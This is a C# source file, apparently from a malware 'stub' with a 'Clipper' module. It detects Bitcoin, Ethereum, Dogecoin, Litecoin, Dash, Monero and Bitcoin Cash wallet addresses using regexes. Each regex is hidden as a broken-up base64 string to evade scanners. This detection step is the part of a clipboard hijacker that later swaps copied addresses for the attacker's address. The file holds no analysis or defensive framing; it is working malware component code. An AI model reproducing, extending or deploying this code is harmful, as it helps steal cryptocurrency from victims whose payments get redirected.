using System.Text.RegularExpressions;

namespace LuxyStub.Modules.Clipper
{

    internal static class RegexAddress
    {
        // ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$
        public static Regex BTC_Regex = new Regex(Base64Decode("XihiYzF8WzEzXSlbYS16QS1--ISi1OUC--1aMC05XXsyNSwzOX0k".Replace("--", "")));

        // ^0x[a-fA-F0-9]{40}$
        public static Regex ETH_Regex = new Regex(Base64Decode("XjB4W2EtZ--kEtRjAtOV17NDB9JA==".Replace("--", "")));

        // ^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$
        public static Regex DOGE_Regex = new Regex(Base64Decode("XkR7MX1bNS05QS1ISi1OU--C1VX--XsxfVsxLTlBLUhKLU5QLVphLWtt--LXpdezMyfSQ=".Replace("--", "")));

        // ^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$
        public static Regex LTC_Regex = new Regex(Base64Decode("XltMTTNdW--2Eta20tekEtSEotTlAtWjEt--OV17MjYsMzN9JA==".Replace("--", "")));

        // ^X[1-9A-HJ-NP-Za-km-z]{33}$
        public static Regex DASH_Regex = new Regex(Base64Decode("XlhbMS05QS1--ISi1OUC1--aYS1rbS16XXszM30k".Replace("--", "")));

        // ^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$
        public static Regex XMR_Regex = new Regex(Base64Decode("Xls0OF1--bMC05QUJdWzEtOUEtS--EotTlAtW--mEta20tel17OTN9JA==".Replace("--", "")));

        // ^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$
        public static Regex BCH_Regex = new Regex(Base64Decode("XigoYml0Y29pbmNhc--2h8YmNocmVn--fGJjaHRlc3QpOik/KHF8cCl--bYS16MC05XXs0MX0k".Replace("--", "")));

        public static int CheckCryptoAddress(string input)
        {
            if (BTC_Regex.IsMatch(input))
            {
                return 0;
            }
            else if (ETH_Regex.IsMatch(input))
            {
                return 1;
            }
            else if (DOGE_Regex.IsMatch(input))
            {
                return 2;
            }
            else if (LTC_Regex.IsMatch(input))
            {
                return 3;
            }
            else if (DASH_Regex.IsMatch(input))
            {
                return 4;
            }
            else if (XMR_Regex.IsMatch(input))
            {
                return 5;
            }
            else if (BCH_Regex.IsMatch(input))
            {
                return 6;
            }
            else
            {
                return -1;
            }
        }

        private static string Base64Decode(string encodeText)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(encodeText);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
    }
}
